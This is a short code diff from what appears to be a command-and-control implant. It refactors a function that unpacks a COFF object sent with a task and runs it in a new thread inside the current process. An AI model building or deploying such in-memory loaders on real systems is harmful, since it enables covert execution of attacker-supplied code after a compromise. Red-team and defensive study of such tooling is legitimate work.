@@ -227,22 +227,23 @@ namespace Memory {
         VOID LoadObject(_parser parser) {
 
             _inject_context inject = { };
-            _coff_params* params = (_coff_params*) Malloc(sizeof(_coff_params));
+            _coff_params* coff = (_coff_params*) Malloc(sizeof(_coff_params));
 
-            params->entrypoint  = UnpackString(&parser, (uint32_t*) &params->entrypoint_length);
-            params->data        = UnpackBytes(&parser, (uint32_t*) &params->data_size);
-            params->args        = UnpackBytes(&parser, (uint32_t*) &params->args_size);
-            params->b_cache     = UnpackBool(&parser);
-            params->task_id     = Ctx->session.current_taskid;
+            coff->entrypoint  = UnpackString(&parser, (uint32_t*) &coff->entrypoint_length);
+            coff->data        = UnpackBytes(&parser, (uint32_t*) &coff->data_size);
+            coff->args        = UnpackBytes(&parser, (uint32_t*) &coff->args_size);
+            coff->b_cache     = UnpackBool(&parser);
+            coff->task_id     = Ctx->session.current_taskid;
 
-            inject.parameter = params;
+            inject.parameter = coff;
 
-            if (!CreateUserThread(NtCurrentProcess(), true, (void*) CoffThread, params, nullptr)) {
+            if (!CreateUserThread(NtCurrentProcess(), true, (void*) CoffThread, coff, nullptr)) {
                 // LOG ERROR
                 return;
             }
 
             Ctx->threads++;
+            AddCoff(coff);
         }
     }
 }
